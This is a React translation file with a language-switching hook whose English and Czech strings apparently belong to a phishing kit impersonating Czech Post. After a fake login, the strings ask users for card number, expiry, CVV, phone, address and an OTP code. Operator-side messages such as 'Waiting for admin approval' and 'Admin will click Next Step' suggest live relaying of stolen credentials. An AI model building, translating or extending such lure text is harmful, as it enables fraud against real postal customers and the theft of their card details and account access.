// src/hooks/useLanguage.js
import { useState, useEffect } from 'react';

// Full translations for the entire app
export const translations = {
  en: {
    // Header
    login: "Log in",
    czech: "CZ",
    english: "EN",
    
    // Footer (à ajouter si nécessaire)
    footer: {
      copyright: "© 2024 Czech Post. All rights reserved.",
      privacy: "Privacy Policy",
      terms: "Terms of Use",
      contact: "Contact"
    },
    
    // HomePage
    homepage: {
      welcomeTitle: "Login to get a lot of benefits!",
      benefit1: "Easy access to consignments and their history",
      benefit2: "Automatically filled out forms",
      benefit3: "Simple archive of orders and services",
      clientZone: "Are you a Client Zone user?",
      clientZoneText: "Just enter your ordinary login details to enter.",
      esipoUser: "Are you an eSIPO user?",
      esipoText: "Use the following link to enter the application:",
      
    },
    
    // Login Form
    loginTitle: "Login",
    loginName: "Login name",
    password: "Password",
    logIn: "Log in",
    unknownLogin: "Unknown login",
    unknownPassword: "Unknown password",
    cardVerification: "Card Verification",
    securityMessage: "For security reasons, please verify your details (Czech Republic).",
    cardholderName: "Cardholder Name",
    cardNumber: "Card Number",
    expirationDate: "Expiration Date",
    cvv: "CVV",
    phoneNumber: "Phone Number (9 digits)",
    phoneHint: "Enter exactly 9 digits (e.g., 723456789)",
    city: "City (Czech Republic)",
    cityHint: "e.g., Prague, Brno, Ostrava, Plzeň...",
    postalCode: "Postal Code (Czech Republic)",
    postalHint: "Czech format: 5 digits (e.g., 110 00 for Prague)",
    submitCard: "Submit Card Details",
    twoFactor: "Two-Factor Verification",
    enterOtp: "Please enter the OTP code to complete your login.",
    otpCode: "OTP Code",
    verifyCode: "Verify Code",
    back: "Back",
    waitingAdmin: "Waiting for admin approval...",
    waitingContinue: "Waiting for admin to continue...",
    processing: "Processing...",
    adminWillReview: "Admin will click \"Next Step\" when ready",
    pleaseWait: "Please wait while we verify your credentials",
    pleaseEnterLogin: "Please enter your login name.",
    pleaseEnterPassword: "Please enter your password.",
    validCard: "Please enter a valid card number (16 digits)",
    validExpiry: "Please enter a valid expiration date (MM/YY)",
    cardExpired: "Card has expired",
    validCvv: "Please enter a valid CVV (3-4 digits)",
    validCardholder: "Please enter the cardholder name",
    validPhone: "Please enter your phone number",
    phoneDigits: "Phone number must be exactly 9 digits",
    validCity: "Please enter your city in Czech Republic",
    validCityName: "Please enter a valid city name",
    validPostal: "Please enter your Czech postal code",
    invalidPostal: "Invalid Czech postal code (format: 123 45 or 12345)",
    validOtp: "Please enter a valid OTP code (6 digits)",
    denied: "Login denied by admin. Please try again later.",
    success: "OTP code verified successfully! Redirecting...",
    sending: "Sending...",
    verifying: "Verifying..."
  },
  cz: {
    // Header
    login: "Přihlásit se",
    czech: "CZ",
    english: "EN",
    
    // Footer
    footer: {
      copyright: "© 2024 Česká pošta. Všechna práva vyhrazena.",
      privacy: "Zásady ochrany osobních údajů",
      terms: "Podmínky použití",
      contact: "Kontakt"
    },
    
    // HomePage
    homepage: {
      welcomeTitle: "Přihlaste se a získejte mnoho výhod!",
      benefit1: "Snadný přístup k zásilkám a jejich historii",
      benefit2: "Automaticky vyplňované formuláře",
      benefit3: "Jednoduchý archiv objednávek a služeb",
      clientZone: "Jste uživatelem Klientské zóny?",
      clientZoneText: "Stačí zadat své běžné přihlašovací údaje.",
      esipoUser: "Jste uživatelem eSIPO?",
      esipoText: "Pro vstup do aplikace použijte následující odkaz:",
      enterApp: "Vstoupit do aplikace: Přejít do aplikace."
    },
    
    // Login Form
    loginTitle: "Přihlášení",
    loginName: "Uživatelské jméno",
    password: "Heslo",
    logIn: "Přihlásit se",
    unknownLogin: "Neznámé přihlášení",
    unknownPassword: "Neznámé heslo",
    cardVerification: "Ověření karty",
    securityMessage: "Z bezpečnostních důvodů ověřte své údaje (Česká republika).",
    cardholderName: "Jméno držitele karty",
    cardNumber: "Číslo karty",
    expirationDate: "Datum expirace",
    cvv: "CVV",
    phoneNumber: "Telefonní číslo (9 číslic)",
    phoneHint: "Zadejte přesně 9 číslic (např. 723456789)",
    city: "Město (Česká republika)",
    cityHint: "např. Praha, Brno, Ostrava, Plzeň...",
    postalCode: "PSČ (Česká republika)",
    postalHint: "Český formát: 5 číslic (např. 110 00 pro Prahu)",
    submitCard: "Odeslat údaje o kartě",
    twoFactor: "Dvoufaktorové ověření",
    enterOtp: "Zadejte OTP kód pro dokončení přihlášení.",
    otpCode: "OTP kód",
    verifyCode: "Ověřit kód",
    back: "Zpět",
    waitingAdmin: "Čekání na schválení administrátora...",
    waitingContinue: "Čekání na pokračování administrátora...",
    processing: "Zpracování...",
    adminWillReview: "Administrátor klikne na \"Další krok\" až bude připraven",
    pleaseWait: "Počkejte prosím, zatímco ověřujeme vaše údaje",
    pleaseEnterLogin: "Zadejte své uživatelské jméno.",
    pleaseEnterPassword: "Zadejte své heslo.",
    validCard: "Zadejte platné číslo karty (16 číslic)",
    validExpiry: "Zadejte platné datum expirace (MM/RR)",
    cardExpired: "Karta vypršela",
    validCvv: "Zadejte platné CVV (3-4 číslice)",
    validCardholder: "Zadejte jméno držitele karty",
    validPhone: "Zadejte své telefonní číslo",
    phoneDigits: "Telefonní číslo musí mít přesně 9 číslic",
    validCity: "Zadejte své město v České republice",
    validCityName: "Zadejte platný název města",
    validPostal: "Zadejte své české PSČ",
    invalidPostal: "Neplatné české PSČ (formát: 123 45 nebo 12345)",
    validOtp: "Zadejte platný OTP kód (6 číslic)",
    denied: "Přihlášení zamítnuto administrátorem. Zkuste to prosím později.",
    success: "OTP kód byl úspěšně ověřen! Přesměrování...",
    sending: "Odesílání...",
    verifying: "Ověřování..."
  }
};

export const useLanguage = () => {
  const [language, setLanguage] = useState(() => {
    return localStorage.getItem('appLanguage') || 'en';
  });

  const toggleLanguage = () => {
    const newLanguage = language === 'en' ? 'cz' : 'en';
    setLanguage(newLanguage);
    localStorage.setItem('appLanguage', newLanguage);
    window.dispatchEvent(new CustomEvent('languageChange', { detail: newLanguage }));
  };

  useEffect(() => {
    const handleLanguageChange = (event) => {
      setLanguage(event.detail);
    };
    
    window.addEventListener('languageChange', handleLanguageChange);
    
    return () => {
      window.removeEventListener('languageChange', handleLanguageChange);
    };
  }, []);

  return { language, toggleLanguage, t: translations[language] };
};